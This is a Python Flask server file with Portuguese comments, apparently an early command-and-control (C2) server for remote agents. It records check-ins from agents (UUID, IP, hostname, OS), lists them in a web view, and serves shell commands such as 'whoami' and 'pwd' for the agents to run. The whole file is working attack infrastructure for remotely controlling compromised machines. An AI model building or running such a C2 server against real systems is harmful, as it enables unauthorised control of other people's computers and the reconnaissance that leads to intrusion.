from flask import Flask, request, jsonify, render_template
import db_manager

app = Flask(__name__)

# --- Inicializa o banco de dados no início da aplicação ---
db_manager.init_db()


@app.route('/checkin', methods=['POST'])
def agent_checkin():
    if request.is_json:
        data = request.get_json()
        uuid = data.get('uuid') # É crucial que o agente envie um UUID
        ip_address = request.remote_addr # Pega o IP real do agente
        hostname = data.get('hostname', 'Desconhecido') # Agente deve enviar o hostname
        os_info = data.get('os_info', 'Desconhecido') # Agente deve enviar info do OS

        if uuid:
            # Substitua o 'agents.append(data)' por uma chamada ao banco de dados
            db_manager.add_or_update_agent(uuid, ip_address, hostname, os_info)
            print(f"Agente {uuid} fez check-in de {ip_address}")
            return jsonify({"status": "success", "message": "Check-in recebido!"}), 200
        else:
            return jsonify({"status": "error", "message": "UUID do agente é obrigatório."}), 400
    return jsonify({"status": "error", "message": "Conteúdo JSON esperado."}), 400

@app.route('/agents')
def view_agents():
    # Substitua 'agents=agents' por uma chamada ao banco de dados
    all_agents = db_manager.get_all_agents()
    return render_template('agents.html', agents=all_agents)


# --- Rotas para a comunicação com os agentes ---

@app.route('/get_commands/<agent_id>', methods=['GET'])
def get_commands(agent_id):
    """
    Rota para os agentes buscarem comandos pendentes.
    """
    print(f"Agente {agent_id} solicitou comandos.")
    # Aqui você chamaria sua lógica de banco de dados para buscar comandos para este agente.
    # Por enquanto, mantive o exemplo fixo, mas a ideia é integrar com o DB.
    # commands = db_manager.get_pending_commands(agent_id) # Você precisaria criar essa função no db_manager
    commands = ["whoami", "pwd"]
    return jsonify({"commands": commands}), 200

# --- Rotas para a interface web do C2  ---

@app.route('/')
def index():
    """
    Página inicial da interface web do C2.
    Irá renderizar um template HTML.
    """
    # Se você quiser exibir a visão geral dos agentes na página inicial,
    # pode buscar os agentes aqui e passá-los para o index.html também.
    # all_agents = db_manager.get_all_agents()
    # return render_template('index.html', agents=all_agents)
    return render_template('index.html')


if __name__ == '__main__':
    # Para rodar o servidor: python server.py
    # Debug=True permite recarregamento automático e mostra erros detalhados.
    # Em produção, você usaria um servidor WSGI como Gunicorn ou uWSGI.
    app.run(debug=True, host='0.0.0.0', port=5000)